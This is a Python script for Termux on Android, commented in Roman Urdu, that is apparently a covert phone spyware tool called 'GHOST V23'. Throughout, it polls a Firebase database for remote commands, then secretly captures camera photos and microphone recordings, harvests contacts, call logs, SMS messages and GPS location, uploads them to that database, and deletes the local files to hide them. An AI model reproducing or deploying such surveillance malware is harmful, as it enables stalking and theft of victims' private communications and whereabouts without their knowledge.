import requests
import time
import os
import json
import base64
import subprocess

# ================= CONFIGURATION =================
# Aapka Firebase Database URL
DB_URL = "https://mytrecker2-b3535-default-rtdb.firebaseio.com"
# Target ki Unique ID
SESSION_ID = "TERMUX_GHOST_PRO"
# =================================================

def run_cmd(cmd):
    """Termux commands ko execute karne aur data lane ke liye"""
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
    except Exception as e:
        return ""

def upload_intel(path, data):
    """Bara data (SMS/Contacts) Firebase par bhejne ke liye"""
    try:
        url = f"{DB_URL}/targets/{SESSION_ID}/{path}.json"
        # Patch istemal hota hai taake purana data delete na ho
        requests.patch(url, json=data, timeout=60)
    except Exception as e:
        print(f"[*] Upload Error: {e}")

def upload_media(file_path, folder_name):
    """Photos aur Audio files ko Base64 mein convert karke bhejne ke liye"""
    try:
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                b64_data = base64.b64encode(f.read()).decode('utf-8')
                
                # File type check karna
                prefix = "data:image/jpeg;base64," if file_path.endswith('.jpg') else "data:audio/mp3;base64,"
                
                payload = {
                    "data": prefix + b64_data,
                    "time": time.strftime("%H:%M:%S"),
                    "date": time.strftime("%d/%m/%Y")
                }
                
                # Post method se har file alag save hogi
                requests.post(f"{DB_URL}/targets/{SESSION_ID}/{folder_name}.json", json=payload, timeout=60)
            
            # File bhejne ke baad mobile se delete karna (Storage bachane ke liye)
            os.remove(file_path)
    except Exception as e:
        print(f"[*] Media Error: {e}")

def get_system_status():
    """Battery aur Live Location update karne ke liye"""
    try:
        # Battery Info
        bat_raw = run_cmd("termux-battery-status")
        bat = json.loads(bat_raw) if bat_raw else {"percentage": 0}
        
        # GPS Location
        loc_raw = run_cmd("termux-location -p gps -n 1")
        loc = json.loads(loc_raw) if loc_raw else {}
        
        status_data = {
            "info": {
                "battery": bat.get("percentage"),
                "status": "ONLINE",
                "last_seen": time.strftime("%H:%M:%S")
            }
        }
        
        if loc:
            status_data["location"] = {"lat": loc.get("latitude"), "lng": loc.get("longitude")}
        
        upload_intel("", status_data)
    except:
        pass

def execute_commands():
    """Admin Panel se aane wali commands ko check aur run karna"""
    try:
        # Commands fetch karna
        resp = requests.get(f"{DB_URL}/commands/{SESSION_ID}.json", timeout=10).json()
        if not resp:
            return

        action = resp.get('act')
        print(f"[!] Executing: {action}")

        # --- CAMERA COMMANDS ---
        if action == 'f': # Front Camera
            os.system("termux-camera-photo -c 0 img.jpg")
            upload_media("img.jpg", "photos")
        
        elif action == 'b': # Back Camera
            os.system("termux-camera-photo -c 1 img.jpg")
            upload_media("img.jpg", "photos")

        # --- AUDIO COMMAND ---
        elif action == 'a': # 10 Second Mic Recording
            os.system("termux-microphone-record -d 10 rec.mp3")
            time.sleep(11)
            upload_media("rec.mp3", "audio")

        # --- INTEL COMMANDS (SMS, Contacts, Calls) ---
        elif action == 'c': # Contacts
            data = run_cmd("termux-contact-list")
            if data: upload_intel("intel", {"contacts": json.loads(data)})
            
        elif action == 'l': # Call Logs
            data = run_cmd("termux-call-log -l 50")
            if data: upload_intel("intel", {"call_logs": json.loads(data)})
            
        elif action == 's': # SMS List
            data = run_cmd("termux-sms-list -l 50")
            if data: upload_intel("intel", {"sms": json.loads(data)})

        # --- GPS COMMAND ---
        elif action == 'g':
            get_system_status()

        # Command execute hone ke baad delete karna taake loop na bane
        requests.delete(f"{DB_URL}/commands/{SESSION_ID}.json")

    except Exception as e:
        print(f"[*] Loop Error: {e}")

# ================= MAIN START =================
if _name_ == "_main_":
    # Termux ko background mein chalne ke liye ijazat
    os.system("termux-wake-lock")
    
    print(f"[*] GHOST V23 STARTED ON: {SESSION_ID}")
    print("[*] Dashboard Link: Ready")
    
    # Pehli baar status update karna
    get_system_status()
    
    while True:
        execute_commands()
        # Har 2 minute baad status auto-update
        if int(time.time()) % 120 == 0:
            get_system_status()
        
        time.sleep(3) # Server par load kam rakhne ke liye 3s delay